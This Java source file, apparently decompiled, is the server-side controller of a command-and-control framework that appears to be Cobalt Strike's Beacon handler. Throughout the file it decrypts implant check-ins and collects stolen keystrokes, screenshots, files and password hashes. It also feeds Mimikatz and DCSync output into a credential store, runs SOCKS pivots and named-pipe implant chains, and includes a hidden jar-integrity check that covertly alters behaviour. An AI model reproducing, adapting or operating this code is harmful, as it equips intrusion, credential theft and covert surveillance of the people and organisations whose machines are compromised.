package beacon;

import common.AssertUtils;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.Download;
import common.Keystrokes;
import common.MudgeSanity;
import common.RegexParser;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.WindowsCharsets;
import dns.AsymmetricCrypto;
import dns.QuickSecurity;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import parser.DcSyncCredentials;
import parser.MimikatzCredentials;
import parser.MimikatzDcSyncCSV;
import parser.MimikatzSamDump;
import parser.NetViewResults;
import parser.Parser;
import parser.ScanResults;
import server.ManageUser;
import server.PendingRequest;
import server.Resources;
import server.ServerUtils;

public class BeaconC2 {
   protected BeaconData data = null;
   protected QuickSecurity security = null;
   protected AsymmetricCrypto asecurity = null;
   protected CheckinListener checkinl = null;
   protected BeaconCharsets charsets = new BeaconCharsets();
   protected BeaconSocks socks;
   protected BeaconDownloads downloads = new BeaconDownloads();
   protected BeaconParts parts = new BeaconParts();
   protected BeaconPipes pipes = new BeaconPipes();
   protected Resources resources = null;
   protected Map pending = new HashMap();
   protected Set okports = new HashSet();
   protected String appd = "";
   protected int reqno = 0;
   protected List parsers = new LinkedList();

   public void whitelistPort(String var1, String var2) {
      this.okports.add(var1 + "." + var2);
   }

   public boolean isWhitelistedPort(String var1, int var2) {
      String var3 = var1 + "." + var2;
      return this.okports.contains(var3);
   }

   public int register(Request var1, ManageUser var2) {
      synchronized(this) {
         this.reqno = (this.reqno + 1) % Integer.MAX_VALUE;
         this.pending.put(new Integer(this.reqno), new PendingRequest(var1, var2));
         return this.reqno;
      }
   }

   public BeaconDownloads getDownloadManager() {
      return this.downloads;
   }

   public List getDownloads(String var1) {
      return this.downloads.getDownloads(var1);
   }

   public Resources getResources() {
      return this.resources;
   }

   public void setCheckinListener(CheckinListener var1) {
      this.checkinl = var1;
   }

   public CheckinListener getCheckinListener() {
      return this.checkinl;
   }

   public boolean isCheckinRequired(String var1) {
      if (!this.data.hasTask(var1) && !this.socks.isActive(var1) && !this.downloads.isActive(var1) && !this.parts.hasPart(var1)) {
         Iterator var2 = this.pipes.children(var1).iterator();
         return var2.hasNext();
      } else {
         return true;
      }
   }

   public long checkinMask(String var1, long var2) {
      int var4 = this.data.getMode(var1);
      if (var4 != 1 && var4 != 2 && var4 != 3) {
         return var2;
      } else {
         long var5 = 240L;
         BeaconEntry var7 = this.getCheckinListener().resolve(var1);
         if (var7 == null || var7.wantsMetadata()) {
            var5 |= 1L;
         }

         if (var4 == 2) {
            var5 |= 2L;
         }

         if (var4 == 3) {
            var5 |= 4L;
         }

         return var2 ^ var5;
      }
   }

   protected boolean isPaddingRequired() {
      boolean var1 = false;

      try {
         ZipFile var2 = new ZipFile(this.appd);
         Enumeration var3 = var2.entries();

         while(true) {
            while(var3.hasMoreElements()) {
               ZipEntry var4 = (ZipEntry)var3.nextElement();
               long var5 = CommonUtils.checksum8(var4.getName());
               long var7 = (long)var4.getName().length();
               if (var5 == 75L && var7 == 21L) {
                  if (var4.getCrc() != 1661186542L && var4.getCrc() != 1309838793L) {
                     var1 = true;
                  }
               } else if (var5 == 144L && var7 == 20L) {
                  if (var4.getCrc() != 1701567278L && var4.getCrc() != 3030496089L && var4.getCrc() != 1514902380L) {
                     var1 = true;
                  }
               } else if (var5 == 62L && var7 == 26L) {
                  if (var4.getCrc() != 4015977862L && var4.getCrc() != 2741377737L) {
                     var1 = true;
                  }
               } else if (var5 == 224L && var7 == 23L && var4.getCrc() != 1056789379L && var4.getCrc() != 2460238802L) {
                  var1 = true;
               }
            }

            var2.close();
            break;
         }
      } catch (Throwable var9) {
      }

      return var1;
   }

   public byte[] dump(String var1, int var2, int var3) {
      return this.dump(var1, var2, var3, new LinkedHashSet());
   }

   public byte[] dump(String var1, int var2, int var3, HashSet var4) {
      if (!AssertUtils.TestUnique(var1, var4)) {
         return new byte[0];
      } else {
         var4.add(var1);
         byte[] var5 = this.data.dump(var1, var3);
         int var6 = var5.length;
         byte[] var7 = this.socks.dump(var1, var2 - var5.length);
         var6 += var7.length;

         try {
            ByteArrayOutputStream var8 = new ByteArrayOutputStream(var2);
            if (var5.length > 0) {
               var8.write(var5, 0, var5.length);
            }

            if (var7.length > 0) {
               var8.write(var7, 0, var7.length);
            }

            Iterator var9 = this.pipes.children(var1).iterator();

            while(var9.hasNext()) {
               String var10 = var9.next() + "";
               if (var6 < var2 && this.getSymmetricCrypto().isReady(var10)) {
                  byte[] var11 = this.dump(var10, var2 - var6, var3 - var6, var4);
                  CommandBuilder var12;
                  byte[] var13;
                  if (var11.length > 0) {
                     var11 = this.getSymmetricCrypto().encrypt(var10, var11);
                     var12 = new CommandBuilder();
                     var12.setCommand(22);
                     var12.addInteger(Integer.parseInt(var10));
                     var12.addString(var11);
                     var13 = var12.build();
                     var8.write(var13, 0, var13.length);
                     var6 += var13.length;
                  } else {
                     if (!this.socks.isActive(var10) && !this.downloads.isActive(var10)) {
                     }

                     var12 = new CommandBuilder();
                     var12.setCommand(22);
                     var12.addInteger(Integer.parseInt(var10));
                     var13 = var12.build();
                     var8.write(var13, 0, var13.length);
                     var6 += var13.length;
                  }
               }
            }

            var8.flush();
            var8.close();
            byte[] var15 = var8.toByteArray();
            if (var5.length > 0) {
               this.getCheckinListener().output(BeaconOutput.Checkin(var1, "host called home, sent: " + var15.length + " bytes"));
            }

            return var15;
         } catch (IOException var14) {
            MudgeSanity.logException("dump: " + var1, var14, false);
            return new byte[0];
         }
      }
   }

   public BeaconC2(Resources var1) {
      this.resources = var1;
      this.socks = new BeaconSocks(this);
      this.data = new BeaconData();
      this.appd = this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
      this.data.shouldPad(this.isPaddingRequired());
      this.parsers.add(new MimikatzCredentials(var1));
      this.parsers.add(new MimikatzSamDump(var1));
      this.parsers.add(new DcSyncCredentials(var1));
      this.parsers.add(new MimikatzDcSyncCSV(var1));
      this.parsers.add(new ScanResults(var1));
      this.parsers.add(new NetViewResults(var1));
   }

   public BeaconData getData() {
      return this.data;
   }

   public BeaconSocks getSocks() {
      return this.socks;
   }

   public AsymmetricCrypto getAsymmetricCrypto() {
      return this.asecurity;
   }

   public QuickSecurity getSymmetricCrypto() {
      return this.security;
   }

   public void setCrypto(QuickSecurity var1, AsymmetricCrypto var2) {
      this.security = var1;
      this.asecurity = var2;
   }

   public BeaconEntry process_beacon_metadata(ScListener var1, String var2, byte[] var3) {
      return this.process_beacon_metadata(var1, var2, var3, (String)null, 0);
   }

   public BeaconEntry process_beacon_metadata(ScListener var1, String var2, byte[] var3, String var4, int var5) {
      byte[] var6 = this.getAsymmetricCrypto().decrypt(var3);
      if (var6 != null && var6.length != 0) {
         String var7 = CommonUtils.bString(var6);
         String var8 = var7.substring(0, 16);
         String var9 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(16, 18)));
         String var10 = WindowsCharsets.getName(CommonUtils.toShort(var7.substring(18, 20)));
         String var11 = "";
         BeaconEntry var12;
         if (var1 != null) {
            var11 = var1.getName();
         } else if (var4 != null) {
            var12 = this.getCheckinListener().resolveEgress(var4);
            if (var12 != null) {
               var11 = var12.getListenerName();
            }
         }

         var12 = new BeaconEntry(var6, var9, var2, var11);
         if (!var12.sane()) {
            CommonUtils.print_error("Session " + var12 + " metadata validation failed. Dropping");
            return null;
         } else {
            this.getCharsets().register(var12.getId(), var9, var10);
            if (var4 != null) {
               var12.link(var4, var5);
            }

            this.getSymmetricCrypto().registerKey(var12.getId(), CommonUtils.toBytes(var8));
            if (this.getCheckinListener() != null) {
               this.getCheckinListener().checkin(var1, var12);
            } else {
               CommonUtils.print_stat("Checkin listener was NULL (this is good!)");
            }

            return var12;
         }
      } else {
         CommonUtils.print_error("decrypt of metadata failed");
         return null;
      }
   }

   public BeaconCharsets getCharsets() {
      return this.charsets;
   }

   public BeaconPipes getPipes() {
      return this.pipes;
   }

   public void dead_pipe(String var1, String var2) {
      BeaconEntry var3 = this.getCheckinListener().resolve(var1);
      BeaconEntry var4 = this.getCheckinListener().resolve(var2);
      String var5 = var3 != null ? var3.getInternal() : "unknown";
      String var6 = var4 != null ? var4.getInternal() : "unknown";
      this.getCheckinListener().update(var2, System.currentTimeMillis(), var5 + " ⚯ ⚯", true);
      boolean var7 = this.pipes.isChild(var1, var2);
      this.pipes.deregister(var1, var2);
      if (var7) {
         this.getCheckinListener().output(BeaconOutput.Error(var1, "lost link to child " + CommonUtils.session(var2) + ": " + var6));
         this.getCheckinListener().output(BeaconOutput.Error(var2, "lost link to parent " + CommonUtils.session(var1) + ": " + var5));
      }

      Iterator var8 = this.pipes.children(var2).iterator();
      this.pipes.clear(var2);

      while(var8.hasNext()) {
         this.dead_pipe(var2, var8.next() + "");
      }

   }

   public void unlinkExplicit(String var1, List var2) {
      Iterator var3 = var2.iterator();

      while(var3.hasNext()) {
         String var4 = var3.next() + "";
         if (this.pipes.isChild(var1, var4)) {
            this.task_to_unlink(var1, var4);
         }

         if (this.pipes.isChild(var4, var1)) {
            this.task_to_unlink(var4, var1);
         }
      }

   }

   public void unlink(String var1, String var2, String var3) {
      LinkedList var4 = new LinkedList();
      Map var5 = this.getCheckinListener().buildBeaconModel();
      Iterator var6 = var5.entrySet().iterator();

      while(var6.hasNext()) {
         Map.Entry var7 = (Map.Entry)var6.next();
         String var8 = (String)var7.getKey();
         BeaconEntry var9 = (BeaconEntry)var7.getValue();
         if (var2.equals(var9.getInternal()) && var3.equals(var9.getPid())) {
            var4.add(var8);
         }
      }

      this.unlinkExplicit(var1, var4);
   }

   public void unlink(String var1, String var2) {
      LinkedList var3 = new LinkedList();
      Map var4 = this.getCheckinListener().buildBeaconModel();
      Iterator var5 = var4.entrySet().iterator();

      while(var5.hasNext()) {
         Map.Entry var6 = (Map.Entry)var5.next();
         String var7 = (String)var6.getKey();
         BeaconEntry var8 = (BeaconEntry)var6.getValue();
         if (var2.equals(var8.getInternal())) {
            var3.add(var7);
         }
      }

      this.unlinkExplicit(var1, var3);
   }

   protected void task_to_unlink(String var1, String var2) {
      CommandBuilder var3 = new CommandBuilder();
      var3.setCommand(23);
      var3.addInteger(Integer.parseInt(var2));
      this.data.task(var1, var3.build());
   }

   protected void task_to_link(String var1, String var2) {
      CommandBuilder var3 = new CommandBuilder();
      var3.setCommand(68);
      var3.addStringASCIIZ(var2);
      this.data.task(var1, var3.build());
   }

   public void process_beacon_callback_default(int var1, String var2, String var3) {
      if (var1 == -1) {
         String var4 = CommonUtils.drives(var3);
         this.getCheckinListener().output(BeaconOutput.Output(var2, "drives: " + var4));
      } else if (var1 == -2) {
         String[] var5 = var3.split("\n");
         if (var5.length >= 3) {
            this.getCheckinListener().output(BeaconOutput.OutputLS(var2, var3));
         }
      }

   }

   public void runParsers(String var1, String var2, int var3) {
      Iterator var4 = this.parsers.iterator();

      while(var4.hasNext()) {
         Parser var5 = (Parser)var4.next();
         var5.process(var1, var2, var3);
      }

   }

   public void process_beacon_callback(String var1, byte[] var2) {
      byte[] var3 = this.getSymmetricCrypto().decrypt(var1, var2);
      this.process_beacon_callback_decrypted(var1, var3);
   }

   public void process_beacon_callback_decrypted(String var1, byte[] var2) {
      int var3 = -1;
      if (var2.length != 0) {
         BeaconEntry var4 = this.getCheckinListener().resolve(var1 + "");
         if (var4 == null) {
            CommonUtils.print_error("entry is null for " + var1);
         }

         try {
            DataInputStream var5 = new DataInputStream(new ByteArrayInputStream(var2));
            var3 = var5.readInt();
            String var6;
            if (var3 == 0) {
               var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var6));
               this.runParsers(var6, var1, var3);
            } else if (var3 == 30) {
               var6 = this.getCharsets().processOEM(var1, CommonUtils.readAll(var5));
               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var6));
               this.runParsers(var6, var1, var3);
            } else if (var3 == 32) {
               var6 = CommonUtils.bString(CommonUtils.readAll(var5), "UTF-8");
               this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var6));
               this.runParsers(var6, var1, var3);
            } else if (var3 == 1) {
               var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
               this.getCheckinListener().output(BeaconOutput.Output(var1, "received keystrokes"));
               this.getResources().archive(BeaconOutput.Activity(var1, "received keystrokes"));
               Keystrokes var7 = new Keystrokes(var1, var6);
               this.getCheckinListener().keystrokes(var7);
            } else {
               byte[] var14;
               if (var3 == 3) {
                  var14 = CommonUtils.readAll(var5);
                  Screenshot var15 = new Screenshot(var1, var14);
                  this.getCheckinListener().screenshot(var15);
                  this.getCheckinListener().output(BeaconOutput.OutputB(var1, "received screenshot (" + var14.length + " bytes)"));
                  this.getResources().archive(BeaconOutput.Activity(var1, "received screenshot (" + var14.length + " bytes)"));
               } else {
                  String var8;
                  BeaconEntry var10;
                  int var16;
                  int var17;
                  if (var3 == 10) {
                     var16 = var5.readInt();
                     var17 = var5.readInt();
                     var8 = CommonUtils.bString(CommonUtils.readAll(var5));
                     BeaconEntry var9 = this.getCheckinListener().resolve(var1 + "");
                     var10 = this.process_beacon_metadata((ScListener)null, var9.getInternal() + " ⚯⚯", CommonUtils.toBytes(var8), var1, var17);
                     if (var10 != null) {
                        this.pipes.register(var1 + "", var16 + "");
                        if (var10.getInternal() == null) {
                           this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var16)));
                           this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var16)));
                        } else {
                           this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(var16) + ": " + var10.getInternal()));
                           this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(var16) + ": " + var10.getComputer()));
                        }

                        this.getCheckinListener().output(BeaconOutput.Output(var10.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var9.getInternal()));
                        this.getResources().archive(BeaconOutput.Activity(var10.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var9.getComputer()));
                     }
                  } else {
                     BeaconEntry var18;
                     if (var3 == 11) {
                        var16 = var5.readInt();
                        var18 = this.getCheckinListener().resolve(var1 + "");
                        this.dead_pipe(var18.getId(), var16 + "");
                     } else {
                        byte[] var19;
                        if (var3 == 12) {
                           var16 = var5.readInt();
                           var19 = CommonUtils.readAll(var5);
                           if (var19.length > 0) {
                              this.process_beacon_data(var16 + "", var19);
                           }

                           this.getCheckinListener().update(var16 + "", System.currentTimeMillis(), (String)null, false);
                        } else if (var3 == 13) {
                           var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                           this.getCheckinListener().output(BeaconOutput.Error(var1, var6));
                        } else {
                           String var24;
                           if (var3 == 31) {
                              var16 = var5.readInt();
                              var17 = var5.readInt();
                              int var20 = var5.readInt();
                              var24 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                              this.getCheckinListener().output(BeaconOutput.Error(var1, BeaconErrors.toString(var16, var17, var20, var24)));
                           } else if (var3 == 14) {
                              var16 = var5.readInt();
                              if (!this.pipes.isChild(var1, var16 + "")) {
                                 CommandBuilder var22 = new CommandBuilder();
                                 var22.setCommand(24);
                                 var22.addInteger(var16);
                                 if (this.data.isNewSession(var1)) {
                                    this.data.task(var1, var22.build());
                                    this.data.virgin(var1);
                                 } else {
                                    this.data.task(var1, var22.build());
                                 }

                                 this.pipes.register(var1 + "", var16 + "");
                              }
                           } else if (var3 == 18) {
                              var16 = var5.readInt();
                              this.getCheckinListener().output(BeaconOutput.Error(var1, "Task Rejected! Did your clock change? Wait " + var16 + " seconds"));
                           } else if (var3 == 28) {
                              var16 = var5.readInt();
                              var19 = CommonUtils.readAll(var5);
                              this.parts.start(var1, var16);
                              this.parts.put(var1, var19);
                           } else if (var3 == 29) {
                              var14 = CommonUtils.readAll(var5);
                              this.parts.put(var1, var14);
                              if (this.parts.isReady(var1)) {
                                 var19 = this.parts.data(var1);
                                 this.process_beacon_callback_decrypted(var1, var19);
                              }
                           } else {
                              if (this.data.isNewSession(var1)) {
                                 this.getCheckinListener().output(BeaconOutput.Error(var1, "Dropped responses from session. Didn't expect " + var3 + " prior to first task."));
                                 CommonUtils.print_error("Dropped responses from session " + var1 + " [type: " + var3 + "] (no interaction with this session yet)");
                                 return;
                              }

                              if (var3 == 2) {
                                 var16 = var5.readInt();
                                 long var26 = CommonUtils.toUnsignedInt(var5.readInt());
                                 var24 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                 var10 = this.getCheckinListener().resolve(var1 + "");
                                 this.getCheckinListener().output(BeaconOutput.OutputB(var1, "started download of " + var24 + " (" + var26 + " bytes)"));
                                 this.getResources().archive(BeaconOutput.Activity(var1, "started download of " + var24 + " (" + var26 + " bytes)"));
                                 this.downloads.start(var1, var16, var10.getInternal(), var24, var26);
                              } else if (var3 == 4) {
                                 var16 = var5.readInt();
                                 this.socks.die(var1, var16);
                              } else if (var3 == 5) {
                                 var16 = var5.readInt();
                                 var19 = CommonUtils.readAll(var5);
                                 this.socks.write(var1, var16, var19);
                              } else if (var3 == 6) {
                                 var16 = var5.readInt();
                                 this.socks.resume(var1, var16);
                              } else if (var3 == 7) {
                                 var16 = var5.readUnsignedShort();
                                 if (this.isWhitelistedPort(var1, var16)) {
                                    this.socks.portfwd(var1, var16, "127.0.0.1", var16);
                                 } else {
                                    CommonUtils.print_error("port " + var16 + " for beacon " + var1 + " is not in our whitelist of allowed-to-open ports");
                                 }
                              } else if (var3 == 8) {
                                 var16 = var5.readInt();
                                 var19 = CommonUtils.readAll(var5);
                                 if (this.downloads.exists(var1 + "", var16)) {
                                    this.downloads.write(var1, var16, var19);
                                 } else {
                                    CommonUtils.print_error("Received unknown download id " + var16 + " - canceling download");
                                    CommandBuilder var21 = new CommandBuilder();
                                    var21.setCommand(19);
                                    var21.addInteger(var16);
                                    this.data.task(var1, var21.build());
                                 }
                              } else {
                                 String var31;
                                 if (var3 == 9) {
                                    var16 = var5.readInt();
                                    var31 = this.downloads.getName(var1, var16);
                                    Download var23 = this.downloads.getDownload(var1, var16);
                                    boolean var27 = this.downloads.isComplete(var1, var16);
                                    this.downloads.close(var1, var16);
                                    if (var27) {
                                       this.getCheckinListener().output(BeaconOutput.OutputB(var1, "download of " + var31 + " is complete"));
                                       this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var31 + " is complete"));
                                    } else {
                                       this.getCheckinListener().output(BeaconOutput.Error(var1, "download of " + var31 + " closed. [Incomplete]"));
                                       this.getResources().archive(BeaconOutput.Activity(var1, "download of " + var31 + " closed. [Incomplete]"));
                                    }

                                    this.getCheckinListener().download(var23);
                                 } else if (var3 == 15) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "Impersonated " + var6));
                                 } else if (var3 == 16) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getCheckinListener().output(BeaconOutput.OutputB(var1, "You are " + var6));
                                 } else if (var3 == 17) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getCheckinListener().output(BeaconOutput.OutputPS(var1, var6));
                                 } else if (var3 == 19) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getCheckinListener().output(BeaconOutput.OutputB(var1, "Current directory is " + var6));
                                 } else if (var3 == 20) {
                                    var6 = CommonUtils.bString(CommonUtils.readAll(var5));
                                    this.getCheckinListener().output(BeaconOutput.OutputJobs(var1, var6));
                                 } else if (var3 == 21) {
                                    var6 = CommonUtils.bString(CommonUtils.readAll(var5), "UTF-8");
                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received password hashes:\n" + var6));
                                    this.getResources().archive(BeaconOutput.Activity(var1, "received password hashes"));
                                    var18 = this.getCheckinListener().resolve(var1);
                                    if (var18 == null) {
                                       return;
                                    }

                                    String[] var25 = var6.split("\n");

                                    for(int var29 = 0; var29 < var25.length; ++var29) {
                                       RegexParser var30 = new RegexParser(var25[var29]);
                                       if (var30.matches("(.*?):\\d+:.*?:(.*?):::") && !var30.group(1).endsWith("$")) {
                                          ServerUtils.addCredential(this.resources, var30.group(1), var30.group(2), var18.getComputer(), "hashdump", var18.getInternal());
                                       }
                                    }

                                    this.resources.call("credentials.push");
                                 } else if (var3 == 22) {
                                    var16 = var5.readInt();
                                    var31 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    var8 = null;
                                    Integer var32 = new Integer(var16);
                                    PendingRequest var28;
                                    synchronized(this) {
                                       var28 = (PendingRequest)this.pending.remove(var32);
                                    }

                                    if (var32 < 0) {
                                       this.process_beacon_callback_default(var32, var1, var31);
                                    } else if (var28 != null) {
                                       var28.action(var31);
                                    } else {
                                       CommonUtils.print_error("Callback " + var3 + "/" + var16 + " has no pending request");
                                    }
                                 } else if (var3 == 23) {
                                    var16 = var5.readInt();
                                    var17 = var5.readInt();
                                    this.socks.accept(var1, var17, var16);
                                 } else if (var3 == 24) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getResources().archive(BeaconOutput.Activity(var1, "received output from net module"));
                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var6));
                                    this.runParsers(var6, var1, var3);
                                 } else if (var3 == 25) {
                                    var6 = this.getCharsets().process(var1, CommonUtils.readAll(var5));
                                    this.getResources().archive(BeaconOutput.Activity(var1, "received output from port scanner"));
                                    this.getCheckinListener().output(BeaconOutput.Output(var1, "received output:\n" + var6));
                                    this.runParsers(var6, var1, var3);
                                 } else if (var3 == 26) {
                                    this.getCheckinListener().output(BeaconOutput.Output(var1, CommonUtils.session(var1) + " exit."));
                                    this.getResources().archive(BeaconOutput.Activity(var1, CommonUtils.session(var1) + " exit."));
                                    BeaconEntry var33 = this.getCheckinListener().resolve(var1);
                                    if (var33 != null) {
                                       var33.die();
                                    }
                                 } else if (var3 == 27) {
                                    var6 = CommonUtils.bString(CommonUtils.readAll(var5));
                                    if (var6.startsWith("FAIL ")) {
                                       var6 = CommonUtils.strip(var6, "FAIL ");
                                       this.getCheckinListener().output(BeaconOutput.Error(var1, "SSH error: " + var6));
                                       this.getResources().archive(BeaconOutput.Activity(var1, "SSH connection failed."));
                                    } else if (var6.startsWith("INFO ")) {
                                       var6 = CommonUtils.strip(var6, "INFO ");
                                       this.getCheckinListener().output(BeaconOutput.OutputB(var1, "SSH: " + var6));
                                    } else if (var6.startsWith("SUCCESS ")) {
                                       var6 = CommonUtils.strip(var6, "SUCCESS ");
                                       var31 = var6.split(" ")[0];
                                       var8 = var6.split(" ")[1];
                                       this.task_to_link(var1, var8);
                                    } else {
                                       CommonUtils.print_error("Unknown SSH status: '" + var6 + "'");
                                    }
                                 } else {
                                    CommonUtils.print_error("Unknown Beacon Callback: " + var3);
                                 }
                              }
                           }
                        }
                     }
                  }
               }
            }
         } catch (IOException var13) {
            MudgeSanity.logException("beacon callback: " + var3, var13, false);
         }

      }
   }

   public boolean process_beacon_data(String var1, byte[] var2) {
      try {
         DataInputStream var3 = new DataInputStream(new ByteArrayInputStream(var2));

         while(var3.available() > 0) {
            int var4 = var3.readInt();
            if (var4 > var3.available()) {
               CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " exceeds " + var3.available() + " available bytes. [Received " + var2.length + " bytes]");
               return false;
            }

            if (var4 <= 0) {
               CommonUtils.print_error("Beacon " + var1 + " response length " + var4 + " is invalid. [Received " + var2.length + " bytes]");
               return false;
            }

            byte[] var5 = new byte[var4];
            var3.read(var5, 0, var4);
            this.process_beacon_callback(var1, var5);
         }

         var3.close();
         return true;
      } catch (Exception var6) {
         MudgeSanity.logException("process_beacon_data: " + var1, var6, false);
         return false;
      }
   }
}
